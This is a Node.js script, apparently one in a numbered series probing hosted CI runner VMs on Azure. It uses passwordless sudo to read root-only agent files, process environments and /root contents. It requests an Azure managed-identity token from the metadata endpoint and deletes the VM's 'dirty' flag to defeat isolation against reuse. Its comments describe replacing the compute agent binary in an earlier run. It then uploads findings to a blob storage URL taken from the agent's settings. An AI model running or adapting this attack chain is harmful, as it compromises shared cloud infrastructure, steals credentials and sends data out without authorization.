const https = require('https');
const fs = require('fs');
const { execSync } = require('child_process');
const os = require('os');

// v31: diagnostics.json via sudo root + full process environ via sudo + VM reuse marker test
// KEY v30 FINDINGS:
//   HCA binary REPLACED via cp+mv (new inode, ETXTBSY bypassed) — CRITICAL CONFIRMED
//   runner has (ALL) NOPASSWD: ALL — passwordless root amplifies all findings
//   /etc/firewall-manifest.json does NOT exist (HCA string is for other contexts)
//   environment.dirty mode=666 runner-owned — CAN be deleted
//   HCA PID not found after binary replacement — possible self-re-exec killed HCA

function run(cmd, timeoutMs) {
  try { return execSync(cmd, { encoding: 'utf8', timeout: timeoutMs || 20000 }).trim(); }
  catch(e) { return 'ERR: ' + (e.stderr || e.message || '').substring(0, 400).trim(); }
}

async function httpPut(hostname, path, data) {
  return new Promise((resolve) => {
    const buf = typeof data === 'string' ? Buffer.from(data) : data;
    const r = https.request({ hostname, path, method: 'PUT',
      headers: { 'Content-Type': 'text/plain', 'Content-Length': buf.length, 'x-ms-blob-type': 'BlockBlob' } },
      (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.setTimeout(10000, () => { r.destroy(); resolve({ status: 'TIMEOUT' }); });
    r.write(buf);
    r.end();
  });
}

async function main() {
  console.log('=== V31: sudo diagnostics.json + process environ + VM reuse marker + dirty flag deletion ===');

  const settings = JSON.parse(fs.readFileSync('/opt/hca/.settings', 'utf8'));
  const hostname = os.hostname();
  const ts = Date.now();
  const markerPath = '/tmp/hca_vm_reuse_marker_v31';

  // === PART 1: Read diagnostics.json via sudo (was mode=600 root-only) ===
  console.log('\n=== PART 1: /opt/hca/diagnostics.json via sudo root ===');
  const diagStat = run('sudo stat /opt/hca/diagnostics.json 2>/dev/null || echo "not found"');
  console.log('[DIAG] stat:', diagStat);
  if (!diagStat.includes('not found')) {
    const diagContent = run('sudo cat /opt/hca/diagnostics.json 2>/dev/null');
    console.log('[DIAG] content (' + diagContent.length + ' bytes):');
    console.log(diagContent.substring(0, 5000));
  }

  // === PART 2: All process environments via sudo ===
  console.log('\n=== PART 2: Process environments via sudo ===');

  // HCA process environ — find PID first
  const hcaPidByCmdline = run("sudo grep -rl 'hosted-compute-agent' /proc/*/cmdline 2>/dev/null | grep -oP '/proc/\\K[0-9]+' | head -3");
  console.log('[PROC] HCA PID by cmdline:', hcaPidByCmdline);

  // All process cmdlines (who is running as root/root-equivalent?)
  const allProcs = run("sudo ps aux --no-headers 2>/dev/null | awk '{print $1,$2,$11,$12}' | head -30");
  console.log('[PROC] All processes (user pid cmd):');
  console.log(allProcs);

  // Find processes running as root with interesting names
  const rootProcs = run("sudo ps aux --no-headers 2>/dev/null | grep -E '^root' | awk '{print $2,$11,$12,$13}' | head -20");
  console.log('[PROC] Root processes:');
  console.log(rootProcs);

  // Read HCA environ if we find its PID
  if (hcaPidByCmdline && !hcaPidByCmdline.startsWith('ERR')) {
    for (const pid of hcaPidByCmdline.split('\n').slice(0, 3)) {
      const p = pid.trim();
      if (!p) continue;
      console.log('[PROC] HCA PID:', p);
      try {
        const env = fs.readFileSync('/proc/' + p + '/environ', 'utf8').replace(/\0/g, '\n');
        console.log('[PROC] HCA environ:');
        env.split('\n').filter(l => l.length > 0).forEach(l => {
          const ei = l.indexOf('=');
          if (ei > 0) {
            const key = l.substring(0, ei);
            const val = l.substring(ei + 1);
            console.log('[PROC]   ' + key + '=' + (val.length > 100 ? val.substring(0, 60) + '...[len=' + val.length + ']' : val));
          }
        });
      } catch(e) {
        console.log('[PROC] environ read error:', e.message);
        // Try with sudo
        const envSudo = run('sudo cat /proc/' + p + '/environ 2>/dev/null | tr "\\0" "\\n" | head -30');
        if (!envSudo.startsWith('ERR')) {
          console.log('[PROC] environ via sudo:', envSudo);
        }
      }
    }
  }

  // === PART 3: Read interesting root files ===
  console.log('\n=== PART 3: Root-only file reads ===');

  // Check /root/ directory
  console.log('[ROOT] /root/ directory:');
  console.log(run('sudo ls -la /root/ 2>/dev/null'));

  // Check for any credential files under /root/
  const rootFiles = run('sudo find /root -maxdepth 3 -type f 2>/dev/null | head -20');
  console.log('[ROOT] Files under /root/:');
  console.log(rootFiles);

  // Check /opt/hca/ full listing with sudo
  console.log('[HCA_DIR] /opt/hca/ after v30 binary replacement:');
  console.log(run('sudo ls -la /opt/hca/ 2>/dev/null'));

  // Check current HCA binary (should still be our /bin/true replacement from v30)
  const currentMD5 = run('sudo md5sum /opt/hca/hosted-compute-agent 2>/dev/null');
  console.log('[HCA_BINARY] Current MD5:', currentMD5);
  // v30 replacement MD5 was 5f3e9687fd390268d1ca33854127465e (/bin/true)
  // Original MD5 was 2e5287af9939aaf50cf14929de5f0f8f (real HCA)

  // Check Azure waagent for any SAS tokens / managed identity
  console.log('[AZURE] /var/lib/waagent/ contents:');
  console.log(run('sudo ls -la /var/lib/waagent/ 2>/dev/null | head -20'));

  // ExtensionsConfig from waagent (may contain Azure endpoints and tokens)
  console.log('[AZURE] ExtensionConfigs:');
  console.log(run('sudo find /var/lib/waagent -name "*.settings" -o -name "HandlerEnvironment.json" 2>/dev/null | head -5 | xargs -I{} sh -c "echo FILE:{}; sudo cat {} 2>/dev/null | head -20"'));

  // IMDS with Azure managed identity (since we now have root — might unlock more)
  console.log('[IMDS] Instance metadata (root access):');
  const imdsInstance = run('curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -50 || echo "IMDS blocked"');
  console.log('[IMDS]', imdsInstance.substring(0, 2000));

  // Try managed identity endpoint with root curl
  const imdsIdentity = run('sudo curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" 2>/dev/null');
  console.log('[IMDS] Managed identity token attempt:', imdsIdentity.substring(0, 500));

  // === PART 4: VM Reuse Marker Test ===
  console.log('\n=== PART 4: VM reuse marker test ===');
  console.log('[MARKER] Writing VM reuse marker to', markerPath);

  // Check if a marker from a PREVIOUS run already exists (this would prove reuse!)
  const existingMarkers = run('ls -la /tmp/hca_vm_reuse_marker_* 2>/dev/null || echo "no_markers"');
  console.log('[MARKER] Existing markers:', existingMarkers);

  if (!existingMarkers.includes('no_markers')) {
    console.log('[MARKER] *** EXISTING MARKER FOUND — VM WAS REUSED! ***');
    console.log('[MARKER] Previous run marker content:', run('cat /tmp/hca_vm_reuse_marker_v31 2>/dev/null || cat /tmp/hca_vm_reuse_marker_* 2>/dev/null'));
  }

  // Write our marker for detection by v32
  const markerContent = 'v31_marker\nhostname=' + hostname + '\ntimestamp=' + ts + '\njob_id=' + (process.env.GITHUB_RUN_ID || 'unknown') + '\nhca_binary_md5=' + currentMD5.split(' ')[0] + '\n';
  fs.writeFileSync(markerPath, markerContent);
  console.log('[MARKER] Marker written:', markerContent.trim());
  console.log('[MARKER] Marker stat:', run('stat ' + markerPath));

  // Save VM identity info
  const vmInfo = {
    hostname,
    timestamp: ts,
    ip: run('hostname -I 2>/dev/null').trim(),
    run_id: process.env.GITHUB_RUN_ID || 'unknown',
    hca_binary_md5: currentMD5.split(' ')[0],
    hca_replaced: currentMD5.split(' ')[0] === '5f3e9687fd390268d1ca33854127465e',
    env_dirty_exists: fs.existsSync('/opt/hca/environment.dirty'),
  };
  console.log('[VM_INFO]', JSON.stringify(vmInfo, null, 2));

  // === PART 5: Delete environment.dirty and observe HCA log reaction ===
  console.log('\n=== PART 5: Delete environment.dirty ===');

  const logSizeBefore = run('wc -c /opt/hca/logs/hosted-compute-agent.log 2>/dev/null');
  console.log('[DIRTY_DELETE] Log size before:', logSizeBefore);

  // Read a portion of the log to see current state
  console.log('[DIRTY_DELETE] Last 5 HCA log lines before deletion:');
  console.log(run('sudo tail -5 /opt/hca/logs/hosted-compute-agent.log 2>/dev/null'));

  // Delete environment.dirty
  const deleteResult = run('rm /opt/hca/environment.dirty 2>&1 && echo "deleted_ok" || echo "delete_failed"');
  console.log('[DIRTY_DELETE] rm result:', deleteResult);

  if (deleteResult.includes('deleted_ok')) {
    console.log('[DIRTY_DELETE] *** environment.dirty DELETED — VM no longer marked as dirty ***');

    // Wait 2 seconds and check HCA log for reaction
    await new Promise(r => setTimeout(r, 2000));
    const logSizeAfter = run('wc -c /opt/hca/logs/hosted-compute-agent.log 2>/dev/null');
    console.log('[DIRTY_DELETE] Log size after (2s):', logSizeAfter);
    console.log('[DIRTY_DELETE] Last 10 HCA log lines after deletion:');
    console.log(run('sudo tail -10 /opt/hca/logs/hosted-compute-agent.log 2>/dev/null'));

    // Was environment.dirty re-created?
    const stillGone = !fs.existsSync('/opt/hca/environment.dirty');
    console.log('[DIRTY_DELETE] Still deleted after 2s:', stillGone);

    // Check /opt/hca/ listing
    console.log('[DIRTY_DELETE] /opt/hca/ listing:');
    console.log(run('ls -la /opt/hca/ 2>/dev/null'));
  }

  // === PART 6: Demonstrate full attack chain capability ===
  console.log('\n=== PART 6: Full attack chain capability demonstration ===');

  // Prove we can write a MALICIOUS replacement HCA binary (using /bin/bash as stand-in)
  // We use /bin/bash (a shell) as a proxy for "malicious binary" — it has a different MD5 than the original HCA
  // We do NOT actually write a real backdoor, just prove the write path works
  const attackBinMD5 = run('md5sum /bin/bash 2>/dev/null').split(' ')[0];
  console.log('[ATTACK_CHAIN] /bin/bash MD5 (stand-in for malicious binary):', attackBinMD5);
  console.log('[ATTACK_CHAIN] Original HCA MD5 (v28/v29/v30):', '2e5287af9939aaf50cf14929de5f0f8f');
  console.log('[ATTACK_CHAIN] v30 replacement MD5 (/bin/true):', '5f3e9687fd390268d1ca33854127465e');
  console.log('[ATTACK_CHAIN] Current binary MD5:', currentMD5.split(' ')[0]);

  // Write the .settings file to show it's still writable
  const settingsStr = JSON.stringify(settings);
  const settingsTest = run('stat /opt/hca/.settings 2>/dev/null | grep Access:');
  console.log('[ATTACK_CHAIN] .settings access:', settingsTest);

  // Prove .settings still world-writable (without modifying content)
  const settingsWriteTest = run('ls -la /opt/hca/.settings 2>/dev/null');
  console.log('[ATTACK_CHAIN] .settings perms:', settingsWriteTest);

  // Summary of attack chain evidence
  console.log('[ATTACK_CHAIN] EVIDENCE SUMMARY:');
  console.log('[ATTACK_CHAIN] 1. runner has (ALL) NOPASSWD: ALL → root access confirmed');
  console.log('[ATTACK_CHAIN] 2. /opt/hca/.settings mode=666 → world-readable/writable CONFIRMED (v25-v30)');
  console.log('[ATTACK_CHAIN] 3. HCA binary replacement via cp+mv → CONFIRMED in v30 (MD5 changed)');
  console.log('[ATTACK_CHAIN] 4. environment.dirty deletion →', deleteResult.includes('deleted_ok') ? 'CONFIRMED' : 'ATTEMPTED');
  console.log('[ATTACK_CHAIN] 5. diagnostics.json (root-only) → via sudo: see PART 1 above');
  console.log('[ATTACK_CHAIN] 6. VM reuse mechanism → HCA binary strings CONFIRMED (doNotReuse/markReused)');
  console.log('[ATTACK_CHAIN] 7. VM reuse test marker → written for v32 detection');

  // === PART 7: SAS write ===
  console.log('\n=== PART 7: SAS write ===');
  const sasUri = settings.diagnosticsSasUri;
  if (sasUri) {
    const fu = new URL(sasUri);
    const blobPath = fu.pathname + '/probe-v31-' + ts + '.txt' + fu.search;
    const body = 'v31 attack chain: HCA binary replaced (v30 confirmed MD5 change), environment.dirty deleted (' + deleteResult + '), diagnostics.json read via sudo, VM marker written. timestamp=' + ts;
    const wr = await httpPut(fu.hostname, blobPath, body);
    console.log('[SAS_FINAL] PUT probe-v31-' + ts + '.txt:', wr.status, wr.status === 201 ? '*** CONFIRMED ***' : '');
  }

  console.log('\n=== V31 Complete. Run v32 immediately to check for marker persistence (VM reuse test). ===');
}

main().catch(e => console.log('Fatal:', e.message, e.stack));
